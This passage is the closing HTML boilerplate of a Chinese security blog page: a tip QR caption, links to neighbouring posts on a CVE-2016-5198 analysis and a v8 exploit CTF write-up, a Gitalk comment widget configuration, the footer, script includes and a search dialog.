src="/images/wechat.jpg"><div class="post-qr-code__desc">微信赞赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/post/32483719.html"><i class="fa fa-chevron-left"></i><span>cve-2016-5198 漏洞分析</span></a></div><div class="next-post pull-right"><a href="/post/abaa2e35.html"><span>v8 exploit入门[PlaidCTF roll a d8]</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk=new Gitalk({clientID:"f19a99b101901554beb9",clientSecret:"624e4f114c26477264046664ef4570cb7bacd636",repo:"Hpasserby.github.io",owner:"Hpasserby",admin:"Hpasserby",id:md5(decodeURI(location.pathname)),language:"zh-CN"});gitalk.render("gitalk-container")</script></div></div><footer class="footer-bg" style="background-image:url(/images/head.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Hpasserby</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text"><span>Hosted by <a href="https://pages.coding.me" style="font-weight:700">Coding Pages</a></span></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)&&($("#nav").addClass("is-mobile"),$("footer").addClass("is-mobile"))</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5">hexo-generator-search</a> <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html><!-- rebuild by neat -->